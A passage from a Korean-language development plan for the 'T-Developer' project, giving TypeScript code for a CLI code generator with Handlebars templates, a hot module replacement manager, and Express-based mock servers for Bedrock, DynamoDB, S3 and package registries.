  spaceAvailableSize: number;
  physicalSpaceSize: number;
}

interface MemoryProfile {
  duration: number;
  samples: MemoryStatus[];
  startUsage: NodeJS.MemoryUsage;
  endUsage: NodeJS.MemoryUsage;
  summary: MemoryProfileSummary;
}

interface MemoryProfileSummary {
  avgHeapUsed: number;
  maxHeapUsed: number;
  minHeapUsed: number;
  trend: 'increasing' | 'stable' | 'decreasing';
  volatility: number;
}
```

**🔧 사용자 작업**:
- Node.js 실행 시 `--expose-gc` 플래그 추가
- 메모리 임계값을 환경에 맞게 조정
- 메모리 누수 감지 시 알림 설정
- 정기적인 힙 스냅샷 생성 스케줄 설정

---

## Task 0.12: 개발 워크플로우 최적화

### SubTask 0.12.1: 자동화된 코드 생성 도구
**목표**: 반복적인 코드 작성을 위한 자동화 도구 구축

**구현 내용**:
```typescript
// scripts/code-generator/generator.ts
import { Command } from 'commander';
import inquirer from 'inquirer';
import { promises as fs } from 'fs';
import path from 'path';
import Handlebars from 'handlebars';
import chalk from 'chalk';

// 템플릿 매니저
class TemplateManager {
  private templatesDir = path.join(__dirname, 'templates');
  private templates: Map<string, HandlebarsTemplateDelegate> = new Map();
  
  async loadTemplates(): Promise<void> {
    const templateFiles = await fs.readdir(this.templatesDir);
    
    for (const file of templateFiles) {
      if (file.endsWith('.hbs')) {
        const name = path.basename(file, '.hbs');
        const content = await fs.readFile(
          path.join(this.templatesDir, file),
          'utf-8'
        );
        this.templates.set(name, Handlebars.compile(content));
      }
    }
    
    this.registerHelpers();
  }
  
  private registerHelpers(): void {
    // 케이스 변환 헬퍼
    Handlebars.registerHelper('camelCase', (str: string) => 
      str.replace(/-./g, x => x[1].toUpperCase())
    );
    
    Handlebars.registerHelper('pascalCase', (str: string) => {
      const camel = str.replace(/-./g, x => x[1].toUpperCase());
      return camel.charAt(0).toUpperCase() + camel.slice(1);
    });
    
    Handlebars.registerHelper('kebabCase', (str: string) =>
      str.replace(/[A-Z]/g, letter => `-${letter.toLowerCase()}`).replace(/^-/, '')
    );
    
    // 조건부 헬퍼
    Handlebars.registerHelper('if_eq', function(a, b, options) {
      if (a === b) {
        return options.fn(this);
      }
      return options.inverse(this);
    });
  }
  
  render(templateName: string, data: any): string {
    const template = this.templates.get(templateName);
    if (!template) {
      throw new Error(`Template '${templateName}' not found`);
    }
    return template(data);
  }
}

// 코드 생성기
class CodeGenerator {
  private templateManager = new TemplateManager();
  
  async initialize(): Promise<void> {
    await this.templateManager.loadTemplates();
  }
  
  // 에이전트 생성
  async generateAgent(name: string): Promise<void> {
    const answers = await inquirer.prompt([
      {
        type: 'list',
        name: 'type',
        message: 'Select agent type:',
        choices: [
          'processing',
          'analysis',
          'generation',
          'integration'
        ]
      },
      {
        type: 'checkbox',
        name: 'capabilities',
        message: 'Select agent capabilities:',
        choices: [
          'database-access',
          'file-operations',
          'api-calls',
          'llm-integration',
          'caching'
        ]
      },
      {
        type: 'input',
        name: 'description',
        message: 'Agent description:'
      }
    ]);
    
    const data = {
      name,
      className: this.toPascalCase(name),
      ...answers
    };
    
    // 에이전트 파일 생성
    const agentCode = this.templateManager.render('agent', data);
    const agentPath = path.join(
      process.cwd(),
      'backend/src/agents',
      `${name}-agent.ts`
    );
    
    await fs.writeFile(agentPath, agentCode);
    
    // 테스트 파일 생성
    const testCode = this.templateManager.render('agent-test', data);
    const testPath = path.join(
      process.cwd(),
      'backend/tests/agents',
      `${name}-agent.test.ts`
    );
    
    await fs.writeFile(testPath, testCode);
    
    // 문서 생성
    const docCode = this.templateManager.render('agent-doc', data);
    const docPath = path.join(
      process.cwd(),
      'docs/agents',
      `${name}-agent.md`
    );
    
    await fs.writeFile(docPath, docCode);
    
    console.log(chalk.green(`✅ Agent '${name}' generated successfully!`));
    console.log(chalk.blue('Generated files:'));
    console.log(`  - ${agentPath}`);
    console.log(`  - ${testPath}`);
    console.log(`  - ${docPath}`);
  }
  
  // API 엔드포인트 생성
  async generateEndpoint(resource: string): Promise<void> {
    const answers = await inquirer.prompt([
      {
        type: 'checkbox',
        name: 'methods',
        message: 'Select HTTP methods:',
        choices: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
        default: ['GET', 'POST', 'PUT', 'DELETE']
      },
      {
        type: 'confirm',
        name: 'authentication',
        message: 'Require authentication?',
        default: true
      },
      {
        type: 'confirm',
        name: 'validation',
        message: 'Include validation?',
        default: true
      },
      {
        type: 'confirm',
        name: 'pagination',
        message: 'Include pagination?',
        default: true
      }
    ]);
    
    const data = {
      resource,
      resourceName: this.toPascalCase(resource),
      ...answers
    };
    
    // 컨트롤러 생성
    const controllerCode = this.templateManager.render('controller', data);
    const controllerPath = path.join(
      process.cwd(),
      'backend/src/controllers',
      `${resource}.controller.ts`
    );
    
    await fs.writeFile(controllerPath, controllerCode);
    
    // 서비스 생성
    const serviceCode = this.templateManager.render('service', data);
    const servicePath = path.join(
      process.cwd(),
      'backend/src/services',
      `${resource}.service.ts`
    );
    
    await fs.writeFile(servicePath, serviceCode);
    
    // 라우트 생성
    const routeCode = this.templateManager.render('route', data);
    const routePath = path.join(
      process.cwd(),
      'backend/src/routes',
      `${resource}.routes.ts`
    );
    
    await fs.writeFile(routePath, routeCode);
    
    // 검증 스키마 생성
    if (answers.validation) {
      const validationCode = this.templateManager.render('validation', data);
      const validationPath = path.join(
        process.cwd(),
        'backend/src/validations',
        `${resource}.validation.ts`
      );
      
      await fs.writeFile(validationPath, validationCode);
    }
    
    console.log(chalk.green(`✅ API endpoint '${resource}' generated successfully!`));
  }
  
  // React 컴포넌트 생성
  async generateComponent(name: string): Promise<void> {
    const answers = await inquirer.prompt([
      {
        type: 'list',
        name: 'type',
        message: 'Component type:',
        choices: ['functional', 'class']
      },
      {
        type: 'confirm',
        name: 'typescript',
        message: 'Use TypeScript?',
        default: true
      },
      {
        type: 'confirm',
        name: 'styles',
        message: 'Include styles?',
        default: true
      },
      {
        type: 'confirm',
        name: 'tests',
        message: 'Include tests?',
        default: true
      },
      {
        type: 'checkbox',
        name: 'hooks',
        message: 'Select hooks to use:',
        choices: ['useState', 'useEffect', 'useContext', 'useReducer', 'useMemo', 'useCallback']
      }
    ]);
    
    const data = {
      name,
      componentName: this.toPascalCase(name),
      ...answers
    };
    
    const ext = answers.typescript ? 'tsx' : 'jsx';
    const styleExt = 'module.css';
    
    // 컴포넌트 디렉토리 생성
    const componentDir = path.join(
      process.cwd(),
      'frontend/src/components',
      name
    );
    await fs.mkdir(componentDir, { recursive: true });
    
    // 컴포넌트 파일 생성
    const componentCode = this.templateManager.render('react-component', data);
    const componentPath = path.join(componentDir, `index.${ext}`);
    await fs.writeFile(componentPath, componentCode);
    
    // 스타일 파일 생성
    if (answers.styles) {
      const styleCode = this.templateManager.render('component-styles', data);
      const stylePath = path.join(componentDir, `styles.${styleExt}`);
      await fs.writeFile(stylePath, styleCode);
    }
    
    // 테스트 파일 생성
    if (answers.tests) {
      const testCode = this.templateManager.render('component-test', data);
      const testPath = path.join(componentDir, `${name}.test.${ext}`);
      await fs.writeFile(testPath, testCode);
    }
    
    // 스토리북 파일 생성
    const storyCode = this.templateManager.render('component-story', data);
    const storyPath = path.join(componentDir, `${name}.stories.${ext}`);
    await fs.writeFile(storyPath, storyCode);
    
    console.log(chalk.green(`✅ Component '${name}' generated successfully!`));
  }
  
  // 유틸리티 메서드
  private toPascalCase(str: string): string {
    return str
      .split(/[-_]/)
      .map(word => word.charAt(0).toUpperCase() + word.slice(1))
      .join('');
  }
}

// CLI 설정
const program = new Command();
const generator = new CodeGenerator();

program
  .name('t-dev-gen')
  .description('T-Developer code generator')
  .version('1.0.0');

program
  .command('agent <name>')
  .description('Generate a new agent')
  .action(async (name) => {
    await generator.initialize();
    await generator.generateAgent(name);
  });

program
  .command('api <resource>')
  .description('Generate API endpoint')
  .action(async (resource) => {
    await generator.initialize();
    await generator.generateEndpoint(resource);
  });

program
  .command('component <name>')
  .description('Generate React component')
  .action(async (name) => {
    await generator.initialize();
    await generator.generateComponent(name);
  });

program.parse();
```

```handlebars
<!-- scripts/code-generator/templates/agent.hbs -->
import { Agent } from '@/core/agent';
import { logger } from '@/config/logger';
{{#if (includes capabilities 'database-access')}}
import { DynamoDBDocumentClient } from '@aws-sdk/lib-dynamodb';
{{/if}}
{{#if (includes capabilities 'llm-integration')}}
import { BedrockClient } from '@aws-sdk/client-bedrock';
{{/if}}

/**
 * {{description}}
 */
export class {{className}}Agent extends Agent {
  static readonly AGENT_NAME = '{{name}}';
  static readonly AGENT_TYPE = '{{type}}';
  
  {{#if (includes capabilities 'database-access')}}
  private docClient: DynamoDBDocumentClient;
  {{/if}}
  {{#if (includes capabilities 'llm-integration')}}
  private bedrockClient: BedrockClient;
  {{/if}}
  
  constructor() {
    super({
      name: {{className}}Agent.AGENT_NAME,
      type: {{className}}Agent.AGENT_TYPE,
      capabilities: [
        {{#each capabilities}}
        '{{this}}',
        {{/each}}
      ]
    });
    
    this.initialize();
  }
  
  private initialize(): void {
    {{#if (includes capabilities 'database-access')}}
    this.docClient = this.createDynamoDBClient();
    {{/if}}
    {{#if (includes capabilities 'llm-integration')}}
    this.bedrockClient = this.createBedrockClient();
    {{/if}}
  }
  
  async execute(input: any): Promise<any> {
    logger.info(`Executing ${this.name} agent`, { input });
    
    try {
      // Validate input
      this.validateInput(input);
      
      // Process input
      const result = await this.process(input);
      
      // Return result
      return {
        success: true,
        data: result,
        metadata: {
          agentName: this.name,
          executionTime: Date.now(),
          version: '1.0.0'
        }
      };
      
    } catch (error) {
      logger.error(`Error in ${this.name} agent`, error);
      throw error;
    }
  }
  
  private validateInput(input: any): void {
    // TODO: Implement input validation
    if (!input) {
      throw new Error('Input is required');
    }
  }
  
  private async process(input: any): Promise<any> {
    // TODO: Implement processing logic
    {{#if_eq type 'processing'}}
    // Processing agent logic
    return this.processData(input);
    {{/if_eq}}
    {{#if_eq type 'analysis'}}
    // Analysis agent logic
    return this.analyzeData(input);
    {{/if_eq}}
    {{#if_eq type 'generation'}}
    // Generation agent logic
    return this.generateOutput(input);
    {{/if_eq}}
    {{#if_eq type 'integration'}}
    // Integration agent logic
    return this.integrateServices(input);
    {{/if_eq}}
  }
  
  {{#if_eq type 'processing'}}
  private async processData(data: any): Promise<any> {
    // TODO: Implement data processing
    return data;
  }
  {{/if_eq}}
  
  {{#if_eq type 'analysis'}}
  private async analyzeData(data: any): Promise<any> {
    // TODO: Implement data analysis
    return { analyzed: true };
  }
  {{/if_eq}}
  
  {{#if_eq type 'generation'}}
  private async generateOutput(input: any): Promise<any> {
    // TODO: Implement output generation
    return { generated: true };
  }
  {{/if_eq}}
  
  {{#if_eq type 'integration'}}
  private async integrateServices(input: any): Promise<any> {
    // TODO: Implement service integration
    return { integrated: true };
  }
  {{/if_eq}}
}
```
---

### SubTask 0.12.2: Hot Module Replacement (HMR) 설정
**목표**: 개발 중 빠른 피드백을 위한 HMR 구성

**구현 내용**:
```typescript
// backend/src/dev/hot-reload.ts
import { spawn, ChildProcess } from 'child_process';
import chokidar from 'chokidar';
import { EventEmitter } from 'events';
import path from 'path';
import { logger } from '../config/logger';
import WebSocket from 'ws';

// HMR 매니저
export class HotModuleReplacementManager extends EventEmitter {
  private watcher?: chokidar.FSWatcher;
  private process?: ChildProcess;
  private wsServer?: WebSocket.Server;
  private reloadTimer?: NodeJS.Timeout;
  private isRestarting = false;
  
  constructor(private config: HMRConfig) {
    super();
  }
  
  // HMR 시작
  async start(): Promise<void> {
    logger.info('Starting Hot Module Replacement...');
    
    // WebSocket 서버 시작 (브라우저 새로고침용)
    this.startWebSocketServer();
    
    // 초기 프로세스 시작
    await this.startProcess();
    
    // 파일 감시 시작
    this.startWatching();
  }
  
  // WebSocket 서버
  private startWebSocketServer(): void {
    this.wsServer = new WebSocket.Server({ port: this.config.wsPort || 3001 });
    
    this.wsServer.on('connection', (ws) => {
      logger.debug('HMR client connected');
      
      ws.on('close', () => {
        logger.debug('HMR client disconnected');
      });
    });
  }
  
  // 파일 감시
  private startWatching(): void {
    const watchPaths = this.config.watchPaths || ['src'];
    const ignorePaths = this.config.ignorePaths || [
      'node_modules',
      'dist',
      'coverage',
      '.git',
      '**/*.test.ts',
      '**/*.spec.ts'
    ];
    
    this.watcher = chokidar.watch(watchPaths, {
      ignored: ignorePaths,
      persistent: true,
      ignoreInitial: true,
      awaitWriteFinish: {
        stabilityThreshold: 300,
        pollInterval: 100
      }
    });
    
    // 파일 변경 이벤트
    this.watcher.on('change', (filePath) => this.handleFileChange(filePath));
    this.watcher.on('add', (filePath) => this.handleFileChange(filePath));
    this.watcher.on('unlink', (filePath) => this.handleFileChange(filePath));
  }
  
  // 파일 변경 처리
  private handleFileChange(filePath: string): void {
    logger.info(`File changed: ${filePath}`);
    
    // 디바운싱
    if (this.reloadTimer) {
      clearTimeout(this.reloadTimer);
    }
    
    this.reloadTimer = setTimeout(() => {
      const ext = path.extname(filePath);
      
      if (this.config.hotReloadableExtensions?.includes(ext)) {
        // Hot reload 가능한 파일
        this.hotReload(filePath);
      } else {
        // 전체 재시작 필요
        this.restartProcess();
      }
    }, this.config.debounceDelay || 100);
  }
  
  // Hot reload 수행
  private async hotReload(filePath: string): Promise<void> {
    try {
      // 캐시에서 모듈 제거
      this.clearModuleCache(filePath);
      
      // 모듈 특정 핫 리로드 로직
      if (filePath.includes('/agents/')) {
        await this.reloadAgent(filePath);
      } else if (filePath.includes('/routes/')) {
        await this.reloadRoute(filePath);
      } else if (filePath.includes('/services/')) {
        await this.reloadService(filePath);
      } else {
        // 기본 핫 리로드
        this.emit('module:reload', filePath);
      }
      
      // 브라우저 새로고침
      this.notifyClients('reload');
      
      logger.info(`Hot reloaded: ${filePath}`);
      
    } catch (error) {
      logger.error('Hot reload failed:', error);
      // 실패 시 전체 재시작
      this.restartProcess();
    }
  }
  
  // 에이전트 리로드
  private async reloadAgent(filePath: string): Promise<void> {
    const agentName = path.basename(filePath, '.ts').replace('-agent', '');
    
    // 에이전트 매니저에 리로드 요청
    if (global.agentManager) {
      await global.agentManager.reloadAgent(agentName);
    }
  }
  
  // 라우트 리로드
  private async reloadRoute(filePath: string): Promise<void> {
    // Express 라우터 재등록
    if (global.app) {
      const routeName = path.basename(filePath, '.ts');
      delete require.cache[require.resolve(filePath)];
      const newRouter = require(filePath).default;
      
      // 기존 라우트 제거 및 새 라우트 등록
      global.app._router.stack = global.app._router.stack.filter(
        (layer: any) => !layer.regexp.test(`/${routeName}`)
      );
      global.app.use(`/api/${routeName}`, newRouter);
    }
  }
  
  // 서비스 리로드
  private async reloadService(filePath: string): Promise<void> {
    const serviceName = path.basename(filePath, '.ts');
    
    // 서비스 컨테이너에서 재등록
    if (global.serviceContainer) {
      delete require.cache[require.resolve(filePath)];
      const ServiceClass = require(filePath).default;
      global.serviceContainer.register(serviceName, new ServiceClass());
    }
  }
  
  // 모듈 캐시 제거
  private clearModuleCache(filePath: string): void {
    const resolvedPath = require.resolve(filePath);
    delete require.cache[resolvedPath];
    
    // 의존성도 함께 제거
    Object.keys(require.cache).forEach((key) => {
      if (require.cache[key]?.children.some(child => child.id === resolvedPath)) {
        delete require.cache[key];
      }
    });
  }
  
  // 프로세스 재시작
  private async restartProcess(): Promise<void> {
    if (this.isRestarting) return;
    
    this.isRestarting = true;
    logger.info('Restarting application...');
    
    // 기존 프로세스 종료
    if (this.process) {
      await this.stopProcess();
    }
    
    // 새 프로세스 시작
    await this.startProcess();
    
    this.isRestarting = false;
    this.notifyClients('restart');
  }
  
  // 프로세스 시작
  private async startProcess(): Promise<void> {
    const command = this.config.command || 'npm';
    const args = this.config.args || ['run', 'dev'];
    
    this.process = spawn(command, args, {
      stdio: 'inherit',
      env: {
        ...process.env,
        NODE_ENV: 'development',
        HMR_ENABLED: 'true'
      }
    });
    
    this.process.on('exit', (code) => {
      if (code !== 0 && !this.isRestarting) {
        logger.error(`Process exited with code ${code}`);
        setTimeout(() => this.restartProcess(), 1000);
      }
    });
    
    // 프로세스 준비 대기
    await this.waitForProcessReady();
  }
  
  // 프로세스 종료
  private async stopProcess(): Promise<void> {
    if (!this.process) return;
    
    return new Promise((resolve) => {
      this.process!.once('exit', resolve);
      this.process!.kill('SIGTERM');
      
      // 강제 종료 타이머
      setTimeout(() => {
        if (this.process) {
          this.process.kill('SIGKILL');
        }
        resolve(undefined);
      }, 5000);
    });
  }
  
  // 프로세스 준비 대기
  private async waitForProcessReady(): Promise<void> {
    const maxAttempts = 30;
    const checkInterval = 1000;
    
    for (let i = 0; i < maxAttempts; i++) {
      try {
        const response = await fetch(`http://localhost:${this.config.appPort || 3000}/health`);
        if (response.ok) {
          logger.info('Application is ready');
          return;
        }
      } catch (error) {
        // 아직 준비되지 않음
      }
      
      await new Promise(resolve => setTimeout(resolve, checkInterval));
    }
    
    throw new Error('Application failed to start');
  }
  
  // 클라이언트에 알림
  private notifyClients(action: string): void {
    if (!this.wsServer) return;
    
    const message = JSON.stringify({ action, timestamp: Date.now() });
    
    this.wsServer.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
  }
  
  // HMR 중지
  async stop(): Promise<void> {
    logger.info('Stopping Hot Module Replacement...');
    
    if (this.watcher) {
      await this.watcher.close();
    }
    
    if (this.process) {
      await this.stopProcess();
    }
    
    if (this.wsServer) {
      this.wsServer.close();
    }
  }
}

// TypeScript 변환기
export class TypeScriptTranspiler {
  private tsNode: any;
  
  constructor() {
    this.tsNode = require('ts-node').register({
      transpileOnly: true,
      compilerOptions: {
        module: 'commonjs',
        target: 'es2020',
        lib: ['es2020'],
        allowJs: true,
        esModuleInterop: true,
        skipLibCheck: true
      }
    });
  }
  
  // 런타임 변환
  transpile(code: string, fileName: string): string {
    const ts = require('typescript');
    
    const result = ts.transpileModule(code, {
      compilerOptions: {
        module: ts.ModuleKind.CommonJS,
        target: ts.ScriptTarget.ES2020,
        esModuleInterop: true
      },
      fileName
    });
    
    return result.outputText;
  }
  
  // require 훅 설치
  installRequireHook(): void {
    const Module = require('module');
    const originalRequire = Module.prototype.require;
    
    Module.prototype.require = function(id: string) {
      // HMR이 활성화된 모듈인지 확인
      if (global.HMR_MODULES?.has(id)) {
        logger.debug(`HMR: Loading module ${id}`);
        
        // 캐시 무효화
        delete require.cache[require.resolve(id)];
      }
      
      return originalRequire.apply(this, arguments);
    };
  }
}

// 프론트엔드 HMR 클라이언트
export const hmrClient = `
(function() {
  const ws = new WebSocket('ws://localhost:3001');
  
  ws.onopen = () => {
    console.log('[HMR] Connected');
  };
  
  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    
    switch (data.action) {
      case 'reload':
        console.log('[HMR] Reloading page...');
        window.location.reload();
        break;
        
      case 'restart':
        console.log('[HMR] Server restarted');
        // 재연결 시도
        setTimeout(() => {
          window.location.reload();
        }, 1000);
        break;
        
      case 'css':
        console.log('[HMR] Updating CSS...');
        updateCSS(data.file);
        break;
    }
  };
  
  ws.onclose = () => {
    console.log('[HMR] Disconnected. Retrying...');
    setTimeout(() => {
      window.location.reload();
    }, 2000);
  };
  
  function updateCSS(file) {
    const links = document.querySelectorAll('link[rel="stylesheet"]');
    const link = Array.from(links).find(l => l.href.includes(file));
    
    if (link) {
      const newLink = link.cloneNode();
      newLink.href = link.href.split('?')[0] + '?t=' + Date.now();
      link.parentNode.replaceChild(newLink, link);
    }
  }
})();
`;

// HMR 설정 타입
interface HMRConfig {
  watchPaths?: string[];
  ignorePaths?: string[];
  hotReloadableExtensions?: string[];
  debounceDelay?: number;
  command?: string;
  args?: string[];
  appPort?: number;
  wsPort?: number;
}

// Express 앱에 HMR 미들웨어 추가
export function setupHMRMiddleware(app: any): void {
  if (process.env.NODE_ENV !== 'development') return;
  
  // HMR 클라이언트 주입
  app.use((req: any, res: any, next: any) => {
    if (req.path.endsWith('.html')) {
      const originalSend = res.send;
      res.send = function(html: string) {
        if (typeof html === 'string' && html.includes('</body>')) {
          html = html.replace('</body>', `<script>${hmrClient}</script></body>`);
        }
        originalSend.call(this, html);
      };
    }
    next();
  });
  
  // 전역 객체 설정
  global.app = app;
  global.HMR_MODULES = new Set();
}
```

### SubTask 0.12.3: 개발용 데이터 모킹 시스템
**목표**: 외부 의존성 없이 개발할 수 있는 모킹 시스템

**구현 내용**:
```typescript
// backend/src/dev/mock-system.ts
import { faker } from '@faker-js/faker';
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';

// 모킹 서비스 매니저
export class MockServiceManager {
  private mockServers: Map<string, any> = new Map();
  private mockData: Map<string, any> = new Map();
  
  // 모든 모킹 서비스 시작
  async startAll(): Promise<void> {
    await Promise.all([
      this.startBedrockMock(),
      this.startDynamoDBMock(),
      this.startS3Mock(),
      this.startExternalAPIMocks()
    ]);
    
    console.log('✅ All mock services started');
  }
  
  // Bedrock API 모킹
  private async startBedrockMock(): Promise<void> {
    const app = express();
    app.use(express.json());
    
    // Claude 모델 응답 모킹
    app.post('/model/anthropic.claude-*/invoke', async (req, res) => {
      const { prompt } = req.body;
      
      // 지연 시뮬레이션
      await this.simulateLatency(500, 2000);
      
      // 모의 응답 생성
      const response = this.generateMockLLMResponse(prompt);
      
      res.json({
        completion: response,
        stop_reason: 'stop_sequence',
        model: req.params[0],
        usage: {
          input_tokens: prompt.split(' ').length * 1.3,
          output_tokens: response.split(' ').length * 1.3
        }
      });
    });
    
    const server = app.listen(4567, () => {
      console.log('🤖 Bedrock mock server running on port 4567');
    });
    
    this.mockServers.set('bedrock', server);
  }
  
  // DynamoDB 모킹
  private async startDynamoDBMock(): Promise<void> {
    const app = express();
    app.use(express.json());
    
    // 테이블별 데이터 저장소
    const tables: Map<string, any[]> = new Map();
    
    // PutItem
    app.post('/tables/:tableName/items', (req, res) => {
      const { tableName } = req.params;
      const item = req.body.Item;
      
      if (!tables.has(tableName)) {
        tables.set(tableName, []);
      }
      
      const tableData = tables.get(tableName)!;
      const existingIndex = tableData.findIndex(i => i.id === item.id);
      
      if (existingIndex >= 0) {
        tableData[existingIndex] = item;
      } else {
        tableData.push(item);
      }
      
      res.json({ Attributes: item });
    });
    
    // GetItem
    app.get('/tables/:tableName/items/:id', (req, res) => {
      const { tableName, id } = req.params;
      const tableData = tables.get(tableName) || [];
      const item = tableData.find(i => i.id === id);
      
      if (item) {
        res.json({ Item: item });
      } else {
        res.status(404).json({ message: 'Item not found' });
      }
    });
    
    // Query
    app.post('/tables/:tableName/query', (req, res) => {
      const { tableName } = req.params;
      const { KeyConditionExpression, ExpressionAttributeValues } = req.body;
      
      const tableData = tables.get(tableName) || [];
      
      // 간단한 쿼리 시뮬레이션
      const results = tableData.filter(item => {
        // 실제 구현에서는 KeyConditionExpression 파싱 필요
        return true;
      });
      
      res.json({
        Items: results,
        Count: results.length,
        ScannedCount: results.length
      });
    });
    
    const server = app.listen(8000, () => {
      console.log('🗃️  DynamoDB mock server running on port 8000');
    });
    
    this.mockServers.set('dynamodb', server);
    
    // 초기 데이터 시딩
    await this.seedDynamoDBData(tables);
  }
  
  // S3 모킹
  private async startS3Mock(): Promise<void> {
    const app = express();
    app.use(express.json());
    app.use(express.raw({ type: '*/*', limit: '100mb' }));
    
    const buckets: Map<string, Map<string, any>> = new Map();
    
    // CreateBucket
    app.put('/:bucket', (req, res) => {
      const { bucket } = req.params;
      
      if (!buckets.has(bucket)) {
        buckets.set(bucket, new Map());
        res.status(200).send();
      } else {
        res.status(409).json({ 
          Code: 'BucketAlreadyExists',
          Message: 'The requested bucket name is not available'
        });
      }
    });
    
    // PutObject
    app.put('/:bucket/:key(*)', (req, res) => {
      const { bucket, key } = req.params;
      
      if (!buckets.has(bucket)) {
        return res.status(404).json({ Code: 'NoSuchBucket' });
      }
      
      const bucketData = buckets.get(bucket)!;
      bucketData.set(key, {
        Body: req.body,
        ContentType: req.headers['content-type'],
        ContentLength: req.body.length,
        ETag: `"${faker.string.alphanumeric(32)}"`,
        LastModified: new Date().toISOString()
      });
      
      res.json({ ETag: bucketData.get(key).ETag });
    });
    
    // GetObject
    app.get('/:bucket/:key(*)', (req, res) => {
      const { bucket, key } = req.params;
      
      if (!buckets.has(bucket)) {
        return res.status(404).json({ Code: 'NoSuchBucket' });
      }
      
      const bucketData = buckets.get(bucket)!;
      const object = bucketData.get(key);
      
      if (!object) {
        return res.status(404).json({ Code: 'NoSuchKey' });
      }
      
      res.set({
        'Content-Type': object.ContentType,
        'Content-Length': object.ContentLength,
        'ETag': object.ETag,
        'Last-Modified': object.LastModified
      });
      
      res.send(object.Body);
    });
    
    const server = app.listen(4568, () => {
      console.log('☁️  S3 mock server running on port 4568');
    });
    
    this.mockServers.set('s3', server);
  }
  
  // 외부 API 모킹
  private async startExternalAPIMocks(): Promise<void> {
    const app = express();
    app.use(express.json());
    
    // NPM Registry 모킹
    app.get('/npm/:package', (req, res) => {
      const packageInfo = this.generateMockNPMPackage(req.params.package);
      res.json(packageInfo);
    });
    
    // GitHub API 모킹
    app.get('/github/repos/:owner/:repo', (req, res) => {
      const repoInfo = this.generateMockGitHubRepo(req.params.owner, req.params.repo);
      res.json(repoInfo);
    });
    
    // PyPI 모킹
    app.get('/pypi/:package', (req, res) => {
      const packageInfo = this.generateMockPyPIPackage(req.params.package);
      res.json(packageInfo);
    });
    
    const server = app.listen(4569, () => {
      console.log('🌐 External API mock server running on port 4569');
    });
    
    this.mockServers.set('external', server);
  }
  
  // 모의 LLM 응답 생성
  private generateMockLLMResponse(prompt: string): string {
    const responses: Record<string, string> = {
      'analyze': 'Based on my analysis, this appears to be a web application project that requires user authentication, data storage, and a RESTful API.',
      'generate': 'Here\'s the generated code:\n\n```javascript\nclass ExampleService {\n  async getData() {\n    return { success: true, data: [] };\n  }\n}\n```',
      'default': faker.lorem.paragraphs(2)
    };
    
    const keyword = Object.keys(responses).find(k => prompt.toLowerCase().includes(k));
    return responses[keyword || 'default'];
  }
  
  // NPM 패키지 정보 생성
  private generateMockNPMPackage(packageName: string): any {
    return {
      name: packageName,
      version: faker.system.semver(),
      description: faker.lorem.sentence(),
      keywords: faker.lorem.words(5).split(' '),
      author: faker.person.fullName(),
      license: faker.helpers.arrayElement(['MIT', 'Apache-2.0', 'GPL-3.0']),
      repository: {
        type: 'git',
        url: `https://github.com/${faker.internet.userName()}/${packageName}`
      },
      dependencies: this.generateMockDependencies(),
      devDependencies: this.generateMockDependencies(),
      downloads: {
        weekly: faker.number.int({ min: 1000, max: 1000000 })
      }
    };
  }
  
  // GitHub 리포지토리 정보 생성
  private generateMockGitHubRepo(owner: string, repo: string): any {
    return {
      id: faker.number.int({ min: 1000000, max: 9999999 }),
      name: repo,
      full_name: `${owner}/${repo}`,
      owner: {
        login: owner,
        avatar_url: faker.image.avatar()
      },
      description: faker.lorem.sentence(),
      fork: false,
      created_at: faker.date.past().toISOString(),
      updated_at: faker.date.recent().toISOString(),
      pushed_at: faker.date.recent().toISOString(),
      stargazers_count: faker.number.int({ min: 0, max: 50000 }),
      watchers_count: faker.number.int({ min: 0, max: 5000 }),
      forks_count: faker.number.int({ min: 0, max: 10000 }),
      language: faker.helpers.arrayElement(['JavaScript', 'TypeScript', 'Python', 'Java', 'Go']),
      license: {
        key: 'mit',
        name: 'MIT License'
      }
    };
  }
  
  // PyPI 패키지 정보 생성
  private generateMockPyPIPackage(packageName: string): any {
    return {
      info: {
        name: packageName,
        version: faker.system.semver(),
        summary: faker.lorem.sentence(),
        author: faker.person.fullName(),
        author_email: faker.internet.email(),
        license: faker.helpers.arrayElement(['MIT', 'Apache-2.0', 'GPL-3.0']),
        keywords: faker.lorem.words(5),
        classifiers: [
          'Development Status :: 4 - Beta',
          'Intended Audience :: Developers',
          'Programming Language :: Python :: 3'
        ]
      },
      releases: this.generateMockReleases()
    };
  }
  
  // 의존성 생성
  private generateMockDependencies(): Record<string, string> {
    const deps: Record<string, string> = {};
    const count = faker.number.int({ min: 3, max: 10 });
    
    for (let i = 0; i < count; i++) {
      const packageName = faker.helpers.arrayElement([
        'express', 'react', 'vue', 'lodash', 'axios',
        'moment', 'uuid', 'bcrypt', 'jsonwebtoken', 'dotenv'
      ]);
      deps[packageName] = `^${faker.system.semver()}`;
    }
    
    return deps;
  }
  
  // 릴리스 정보 생성
  private generateMockReleases(): Record<string, any[]> {
    const releases: Record<string, any[]> = {};
    const versionCount = faker.number.int({ min: 3, max: 10 });
    
    for (let i = 0; i < versionCount; i++) {
      const version = faker.system.semver();
      releases[version] = [{
        filename: `package-${version}.tar.gz`,
        size: faker.number.int({ min: 10000, max: 1000000 }),
        upload_time: faker.date.past().toISOString()
      }];
    }
    
    return releases;
  }
  
  // DynamoDB 초기 데이터 시딩
  private async seedDynamoDBData(tables: Map<string, any[]>): Promise<void> {
    // Projects 테이블
    const projects = [];
    for (let i = 0; i < 20; i++) {
      projects.push({
        id: `proj_${faker.string.uuid()}`,
        name: faker.commerce.productName(),
        description: faker.lorem.paragraph(),
        status: faker.helpers.arrayElement(['analyzing', 'building', 'completed']),
        createdAt: faker.date.past().toISOString()
      });
    }
    tables.set('T-Developer-Projects', projects);
    
    // Components 테이블
    const components = [];
    for (let i = 0; i < 50; i++) {
      components.push({
        id: `comp_${faker.string.uuid()}`,
        name: faker.hacker.noun(),
        version: faker.system.semver(),
        language: faker.helpers.arrayElement(['javascript', 'typescript', 'python']),
        downloads: faker.number.int({ min: 100, max: 100000 })
      });
    }
    tables.set('T-Developer-Components', components);
  }
  
  // 지연 시뮬레이션
  private async simulateLatency(min: number, max: number): Promise<void> {
    const delay = faker.number.int({ min, max });
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  // 모든 모킹 서비스 중지
  async stopAll(): Promise<void> {
    for (const [name, server] of this.mockServers) {
      server.close();
      console.log(`🛑 ${name} mock server stopped`);
    }
    
